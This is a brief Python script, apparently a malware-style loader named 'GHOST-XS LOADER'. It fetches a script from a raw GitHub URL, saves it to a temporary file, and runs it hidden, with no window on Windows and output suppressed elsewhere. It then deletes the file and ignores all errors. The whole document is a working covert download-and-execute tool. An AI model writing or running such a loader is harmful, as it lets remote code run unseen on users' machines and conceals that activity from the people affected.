#!/usr/bin/env python
# GHOST-XS LOADER - Completely silent, runs and exits

import os,sys,subprocess,tempfile,urllib.request,time

# Your main script RAW URL
U="https://raw.githubusercontent.com/Ghostxs90/External-basic-streamer-/main/GHOST.py"

try:
    # Download
    r=urllib.request.urlopen(urllib.request.Request(U,headers={'User-Agent':'Mozilla/5.0'}),timeout=10)
    s=r.read().decode()
    
    # Temp file
    with tempfile.NamedTemporaryFile(mode='w',suffix='.py',delete=False) as f:
        f.write(s)
        t=f.name
    
    # Run hidden
    if sys.platform=="win32":
        si=subprocess.STARTUPINFO()
        si.dwFlags|=subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow=0
        subprocess.Popen(['pythonw',t],startupinfo=si,creationflags=subprocess.CREATE_NO_WINDOW,close_fds=True)
    else:
        subprocess.Popen(['python3',t],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    
    # Clean up
    time.sleep(2)
    os.unlink(t)
except:
    pass